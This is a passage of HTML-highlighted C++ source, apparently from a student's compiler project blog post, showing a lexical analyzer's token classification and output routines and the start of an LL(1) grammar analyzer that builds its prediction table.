class="number">0</span>;</span><br><span class="line">                    words = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">-1</span>:   <span class="comment">// -1作为一个暂态，处理不需要状态实际转移的情况</span></span><br><span class="line">                    len += <span class="number">1</span>;</span><br><span class="line">                    words += wd;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:    <span class="comment">// 不为0就更新状态</span></span><br><span class="line">                    status = _s;</span><br><span class="line">                    len += <span class="number">1</span>;</span><br><span class="line">                    words += wd;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">output</span><span class="params">()</span></span>&#123;   <span class="comment">// 存储词元、输出、初始化</span></span><br><span class="line">            <span class="keyword">switch</span>(type)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">break</span>;      <span class="comment">// 关键字</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:    <span class="comment">// 运算符</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>; i&lt;<span class="number">33</span>; i++)</span><br><span class="line">                        <span class="keyword">if</span>(wordsTable[i] == words)&#123;</span><br><span class="line">                            cag = i+<span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;  <span class="comment">// 跳出for循环而非case</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="comment">// 出错啦</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">break</span>;      <span class="comment">// 常数</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:    <span class="comment">// 界符</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">50</span>; i&lt;<span class="number">56</span>; i++)</span><br><span class="line">                        <span class="keyword">if</span>(wordsTable[i] == words)&#123;</span><br><span class="line">                            cag = i+<span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 出错啦</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:    <span class="comment">// 标识符</span></span><br><span class="line">                    cag = <span class="number">45</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:     <span class="comment">// 注释 无需输出与存储，初始化后退出</span></span><br><span class="line">                    <span class="built_in">newStatus</span>(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            wordsLen += <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;(%d)(%d,%s)\n&quot;</span>, wordsLen, cag, words.<span class="built_in">c_str</span>());</span><br><span class="line">            strV.<span class="built_in">push_back</span>(words);   <span class="comment">// 存储词元</span></span><br><span class="line">            typeV.<span class="built_in">push_back</span>(cag);   <span class="comment">// 存储词元</span></span><br><span class="line">            <span class="built_in">newStatus</span>(<span class="number">0</span>);   <span class="comment">// 初始化</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isBlank</span><span class="params">()</span><span class="type">const</span></span>&#123;    <span class="comment">// 检测空白字符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(filt[i] == wd) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isDelimiter</span><span class="params">()</span><span class="type">const</span></span>&#123;    <span class="comment">// 判断是否是单字分界符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(wd == delm[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isKeywords</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断关键字，返回种别码或0</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;keyWordsLen; i++)</span><br><span class="line">                <span class="keyword">if</span>(words == wordsTable[i]) <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isNumber</span><span class="params">(<span class="type">int</span> lim = <span class="number">10</span>)</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断数字</span></span><br><span class="line">            <span class="keyword">switch</span> (lim)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 除0以外的十进制数字</span></span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">10</span>:        <span class="comment">// 十进制</span></span><br><span class="line">                    <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;7&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;9&#x27;</span> || wd &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;f&#x27;</span> || wd &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;F&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isLowerLetter</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断大写字母</span></span><br><span class="line">            <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;z&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isUpperLetter</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断大写字母</span></span><br><span class="line">            <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;Z&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">printSplit</span><span class="params">(string text)</span></span>&#123;  <span class="comment">// 输出夹带文本的分割线</span></span><br><span class="line">            <span class="keyword">if</span>(silence==<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> aLen = <span class="number">60</span>;</span><br><span class="line">            <span class="type">int</span> _len = text.<span class="built_in">length</span>()+<span class="number">2</span>; <span class="comment">// 两侧留空</span></span><br><span class="line">            <span class="type">int</span> left = (aLen-_len)/<span class="number">2</span>, right = aLen - left - _len;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;left; i++) <span class="built_in">newPrintf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot; %s &quot;</span>, text.<span class="built_in">c_str</span>());</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;right; i++) <span class="built_in">newPrintf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">newPrintf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>&#123;   <span class="comment">// 重载自己的printf, 便于保存输出的内容, 参考: https://blog.csdn.net/weixin_51281362/article/details/125445742 | https://blog.csdn.net/wanruiou/article/details/115180466</span></span><br><span class="line">            <span class="keyword">if</span>(silence==<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">            va_list arg;    </span><br><span class="line">            <span class="built_in">va_start</span>(arg, fmt); <span class="comment">// 传入地址</span></span><br><span class="line">            <span class="built_in">vprintf</span>(fmt, arg); </span><br><span class="line">            <span class="keyword">if</span>(needOF)  <span class="comment">// 需要保存至文件</span></span><br><span class="line">                <span class="built_in">vfprintf</span>(oF, fmt, arg); <span class="comment">// 借助FILE将printf重定向至文件流, 参考: https://blog.csdn.net/LuyaoYing001/article/details/79750833</span></span><br><span class="line">            <span class="built_in">va_end</span>(arg);    <span class="comment">// 结束可变参数的获取</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getVL</span><span class="params">()</span><span class="type">const</span></span>&#123; <span class="keyword">return</span> typeV.<span class="built_in">size</span>(); &#125;    <span class="comment">// 数组长度</span></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">atTV</span><span class="params">(<span class="type">int</span> n)</span><span class="type">const</span></span>&#123; <span class="keyword">return</span> typeV[n]; &#125;    </span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getTV</span><span class="params">()</span><span class="type">const</span></span>&#123; <span class="keyword">return</span> typeV; &#125;   </span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">getSV</span><span class="params">()</span><span class="type">const</span></span>&#123; <span class="keyword">return</span> strV; &#125;   </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> threshold=<span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getLen</span><span class="params">(T&amp; arr)</span></span>&#123; <span class="comment">// 快速获取数组长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sizeof</span>(arr)/<span class="built_in">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grammarAnalyzer</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; S;</span><br><span class="line">        map&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;<span class="type">int</span>&gt;&gt; init;  <span class="comment">// 预测表</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; typeV;</span><br><span class="line">        vector&lt;string&gt; strV;</span><br><span class="line">        <span class="type">int</span> flag;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">grammarAnalyzer</span>(vector&lt;<span class="type">int</span>&gt; tv, vector&lt;string&gt; sv):<span class="built_in">typeV</span>(tv), <span class="built_in">strV</span>(sv)&#123;  <span class="comment">// 初始化预测表</span></span><br><span class="line">            typeV.<span class="built_in">push_back</span>(<span class="number">0</span>);   <span class="comment">// 终止符#外标记为0，内标记为-1</span></span><br><span class="line">            strV.<span class="built_in">push_back</span>(<span class="string">&quot;#&quot;</span>);   <span class="comment">// 终止符#外标记为0，内标记为-1</span></span><br><span class="line">            <span class="type">int</span> tmp1[]=&#123;<span class="number">101</span>,<span class="number">50</span>,<span class="number">44</span>,<span class="number">0</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">100</span>, <span class="number">0</span>, tmp1, <span class="built_in">getLen</span>(tmp1));</span><br><span class="line">            <span class="type">int</span> tmp2[]=&#123;<span class="number">51</span>,<span class="number">5</span>,<span class="number">106</span>,<span class="number">4</span>,<span class="number">102</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">101</span>, <span class="number">1</span>, tmp2, <span class="built_in">getLen</span>(tmp2));</span><br><span class="line">            <span class="type">int</span> tmp3[]=&#123;<span class="number">103</span>,<span class="number">1</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">102</span>, <span class="number">1</span>, tmp3, <span class="built_in">getLen</span>(tmp3));</span><br><span class="line">            <span class="type">int</span> tmp4[]=&#123;<span class="number">124</span>,<span class="number">50</span>,<span class="number">104</span>,<span class="number">53</span>,<span class="number">105</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">103</span>, <span class="number">44</span>, tmp4, <span class="built_in">getLen</span>(tmp4));</span><br><span class="line">            <span class="type">int</span> tmp5[]=&#123;<span class="number">2</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">104</span>, <span class="number">2</span>, tmp5, <span class="built_in">getLen</span>(tmp5));</span><br><span class="line">            <span class="type">int</span> tmp6[]=&#123;<span class="number">3</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">104</span>, <span class="number">3</span>, tmp6, <span class="built_in">getLen</span>(tmp6));</span><br><span class="line">            <span class="type">int</span> tmp7[]=&#123;<span class="number">125</span>,<span class="number">121</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">105</span>, <span class="number">44</span>, tmp7, <span class="built_in">getLen</span>(tmp7));</span><br><span class="line">            <span class="type">int</span> tmp8[]=&#123;<span class="number">126</span>,<span class="number">107</span>&#125;;<span class="type">int</span> tmp9[]=&#123;<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">44</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">106</span>, tmp8, tmp9, <span class="built_in">getLen</span>(tmp8), <span class="built_in">getLen</span>(tmp9));</span><br><span class="line">            <span class="type">int</span> tmp10[]=&#123;<span class="number">111</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">4</span>, tmp10, <span class="built_in">getLen</span>(tmp10));</span><br><span class="line">            <span class="type">int</span> tmp11[]=&#123;<span class="number">109</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">6</span>, tmp11, <span class="built_in">getLen</span>(tmp11));</span><br><span class="line">            <span class="type">int</span> tmp12[]=&#123;<span class="number">110</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">9</span>, tmp12, <span class="built_in">getLen</span>(tmp12));</span><br><span class="line">            <span class="type">int</span> tmp13[]=&#123;<span class="number">111</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">4</span>, tmp13, <span class="built_in">getLen</span>(tmp13));</span><br><span class="line">            <span class="type">int</span> tmp14[]=&#123;<span class="number">108</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">44</span>, tmp14, <span class="built_in">getLen</span>(tmp14));</span><br><span class="line">            <span class="type">int</span> tmp15[]=&#123;<span class="number">112</span>,<span class="number">30</span>,<span class="number">121</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">108</span>, <span class="number">44</span>, tmp15, <span class="built_in">getLen</span>(tmp15));</span><br><span class="line">            <span class="type">int</span> tmp16[]=&#123;<span class="number">107</span>,<span class="number">8</span>,<span class="number">107</span>,<span class="number">7</span>,<span class="number">120</span>,<span class="number">6</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">109</span>, <span class="number">6</span>, tmp16, <span class="built_in">getLen</span>(tmp16));</span><br><span class="line">            <span class="type">int</span> tmp17[]=&#123;<span class="number">107</span>,<span class="number">10</span>,<span class="number">120</span>,<span class="number">9</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">110</span>, <span class="number">9</span>, tmp17, <span class="built_in">getLen</span>(tmp17));</span><br><span class="line">            <span class="type">int</span> tmp18[]=&#123;<span class="number">5</span>,<span class="number">106</span>,<span class="number">4</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">111</span>, <span class="number">4</span>, tmp18, <span class="built_in">getLen</span>(tmp18));</span><br><span class="line">            <span class="type">int</span> tmp19[]=&#123;<span class="number">113</span>,<span class="number">116</span>&#125;;<span class="type">int</span> tmp20[]=&#123;<span class="number">40</span>,<span class="number">41</span>,<span class="number">44</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">112</span>, tmp19, tmp20, <span class="built_in">getLen</span>(tmp19), <span class="built_in">getLen</span>(tmp20));</span><br><span class="line">            <span class="type">int</span> tmp21[]=&#123;<span class="number">128</span>&#125;;<span class="type">int</span> tmp22[]=&#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">50</span>,<span class="number">55</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">113</span>, tmp21, tmp22, <span class="built_in">getLen</span>(tmp21), <span class="built_in">getLen</span>(tmp22));</span><br><span class="line">            <span class="type">int</span> tmp23[]=&#123;<span class="number">114</span>&#125;;<span class="type">int</span> tmp24[]=&#123;<span class="number">20</span>,<span class="number">21</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">113</span>, tmp23, tmp24, <span class="built_in">getLen</span>(tmp23), <span class="built_in">getLen</span>(tmp24));</span><br><span class="line">            <span class="type">int</span> tmp25[]=&#123;<span class="number">128</span>&#125;;<span class="type">int</span> tmp26[]=&#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">50</span>,<span class="number">55</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">114</span>, tmp25, tmp26, <span class="built_in">getLen</span>(tmp25), <span class="built_in">getLen</span>(tmp26));</span><br><span class="line">            <span class="type">int</span> tmp27[]=&#123;<span class="number">114</span>,<span class="number">115</span>&#125;;<span class="type">int</span> tmp28[]=&#123;<span class="number">20</span>,<span class="number">21</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">114</span>, tmp27, tmp28, <span class="built_in">getLen</span>(tmp27), <span class="built_in">getLen</span>(tmp28));</span><br><span class="line">            <span class="type">int</span> tmp29[]=&#123;<span class="number">116</span>,<span class="number">20</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">115</span>, <span class="number">20</span>, tmp29, <span class="built_in">getLen</span>(tmp29));</span><br><span class="line">            <span class="type">int</span> tmp30[]=&#123;<span class="number">116</span>,<span class="number">21</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">115</span>, <span class="number">21</span>, tmp30, <span class="built_in">getLen</span>(tmp30));</span><br><span class="line">            <span class="type">int</span> tmp31[]=&#123;<span class="number">127</span>,<span class="number">119</span>&#125;;<span class="type">int</span> tmp32[]=&#123;<span class="number">40</span>,<span class="number">41</span>,<span class="number">44</span>,<span class="number">54</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">116</span>, tmp31, tmp32, <span class="built_in">getLen</span>(tmp31), <span class="built_in">getLen</span>(tmp32));</span><br><span class="line">            <span class="type">int</span> tmp33[]=&#123;<span class="number">128</span>&#125;;<span class="type">int</span> tmp34[]=&#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">50</span>,<span class="number">55</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">117</span>, tmp33, tmp34, <span class="built_in">getLen</span>(tmp33), <span class="built_in">getLen</span>(tmp34));</span><br><span class="line">            <span class="type">int</span> tmp35[]=&#123;<span class="number">117</span>,<span class="number">118</span>&#125;;<span class="type">int</span> tmp36[]=&#123;<span class="number">22</span>,<span class="number">23</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">117</span>, tmp35, tmp36, <span class="built_in">getLen</span>(tmp35), <span class="built_in">getLen</span>(tmp36));</span><br><span class="line">            <span class="type">int</span> tmp37[]=&#123;<span class="number">119</span>,<span class="number">22</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">118</span>, <span class="number">22</span>, tmp37, <span class="built_in">getLen</span>(tmp37));</span><br><span class="line">            <span class="type">int</span> tmp38[]=&#123;<span class="number">119</span>,<span class="number">23</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">118</span>, <span class="number">23</span>, tmp38, <span class="built_in">getLen</span>(tmp38));</span><br><span class="line">            <span class="type">int</span> tmp39[]=&#123;<span class="number">122</span>&#125;;<span class="type">int</span> tmp40[]=&#123;<span class="number">40</span>,<span class="number">41</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">119</span>, tmp39, tmp40, <span class="built_in">getLen</span>(tmp39), <span class="built_in">getLen</span>(tmp40));</span><br><span class="line">            <span class="type">int</span> tmp41[]=&#123;<span class="number">121</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">119</span>, <span class="number">44</span>, tmp41, <span class="built_in">getLen</span>(tmp41));</span><br><span class="line">            <span class="type">int</span> tmp42[]=&#123;<span class="number">55</span>,<span class="number">112</span>,<span class="number">54</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">119</span>, <span class="number">54</span>, tmp42, <span class="built_in">getLen</span>(tmp42));</span><br><span class="line">            <span class="type">int</span> tmp43[]=&#123;<span class="number">112</span>,<span class="number">123</span>,<span class="number">112</span>&#125;;<span class="type">int</span> tmp44[]=&#123;<span class="number">40</span>,<span class="number">41</span>,<span class="number">44</span>,<span class="number">54</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">120</span>, tmp43, tmp44, <span class="built_in">getLen</span>(tmp43), <span class="built_in">getLen</span>(tmp44));</span><br><span class="line">            <span class="type">int</span> tmp45[]=&#123;<span class="number">44</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">121</span>, <span class="number">44</span>, tmp45, <span class="built_in">getLen</span>(tmp45));</span><br><span class="line">            <span class="type">int</span> tmp46[]=&#123;<span class="number">40</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">122</span>, <span class="number">40</span>, tmp46, <span class="built_in">getLen</span>(tmp46));</span><br><span class="line">            <span class="type">int</span> tmp47[]=&#123;<span class="number">41</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">122</span>, <span class="number">41</span>, tmp47, <span class="built_in">getLen</span>(tmp47));</span><br><span class="line">            <span class="type">int</span> tmp48[]=&#123;<span class="number">24</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">24</span>, tmp48, <span class="built_in">getLen</span>(tmp48));</span><br><span class="line">            <span class="type">int</span> tmp49[]=&#123;<span class="number">25</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">25</span>, tmp49, <span class="built_in">getLen</span>(tmp49));</span><br><span class="line">            <span class="type">int</span> tmp50[]=&#123;<span class="number">26</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">26</span>, tmp50, <span class="built_in">getLen</span>(tmp50));</span><br><span class="line">            <span class="type">int</span> tmp51[]=&#123;<span class="number">27</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">27</span>, tmp51, <span class="built_in">getLen</span>(tmp51));</span><br><span class="line">            <span class="type">int</span> tmp52[]=&#123;<span class="number">28</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">28</span>, tmp52, <span class="built_in">getLen</span>(tmp52));</span><br><span class="line">            <span class="type">int</span> tmp53[]=&#123;<span class="number">29</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">29</span>, tmp53, <span class="built_in">getLen</span>(tmp53));</span><br><span class="line">            <span class="type">int</span> tmp54[]=&#123;<span class="number">128</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">124</span>, <span class="number">4</span>, tmp54, <span class="built_in">getLen</span>(tmp54));</span><br><span class="line">            <span class="type">int</span> tmp55[]=&#123;<span class="number">105</span>,<span class="number">52</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">125</span>, <span class="number">52</span>, tmp55, <span class="built_in">getLen</span>(tmp55));</span><br><span class="line">            <span class="type">int</span> tmp56[]=&#123;<span class="number">128</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">125</span>, <span class="number">53</span>, tmp56, <span class="built_in">getLen</span>(tmp56));</span><br><span class="line">            <span class="type">int</span> tmp57[]=&#123;<span class="number">128</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">126</span>, <span class="number">5</span>, tmp57, <span class="built_in">getLen</span>(tmp57));</span><br><span class="line">            <span class="type">int</span> tmp58[]=&#123;<span class="number">106</span>,<span class="number">50</span>&#125;;<span class="built_in">buildMap</span>(<span class="number">126</span>, <span class="number">50</span>, tmp58, <span class="built_in">getLen</span>(tmp58));</span><br><span class="line">            <span class="type">int</span> tmp59[]=&#123;<span class="number">128</span>&#125;;<span class="type">int</span> tmp60[]=&#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">50</span>,<span class="number">55</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">127</span>, tmp59, tmp60, <span class="built_in">getLen</span>(tmp59), <span class="built_in">getLen</span>(tmp60));</span><br><span class="line">            <span class="type">int</span> tmp61[]=&#123;<span class="number">117</span>&#125;;<span class="type">int</span> tmp62[]=&#123;<span class="number">22</span>,<span class="number">23</span>&#125;;<span class="built_in">buildMoreMap</span>(<span class="number">127</span>, tmp61, tmp62, <span class="built_in">getLen</span>(tmp61), <span class="built_in">getLen</span>(tmp62));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">buildMoreMap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> V[], <span class="type">int</span> s[], <span class="type">int</span> len, <span class="type">int</span> lens)</span></span>&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(V[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j&lt;lens; j++)&#123;</span><br><span class="line">                <span class="function">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">p</span><span class="params">(a, s[j])</span></span>;</span><br><span class="line">                <span class="keyword">if</span>(init.<span class="built_in">count</span>(p)) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 重复定义</span></span><br><span class="line">                init[p]=v;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">buildMap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> V[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">            <span class="function">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">p</span><span class="params">(a, b)</span></span>;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(V[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            init[p]=v;</span><br><span class="line">            <span class="keyword">return</span> <span 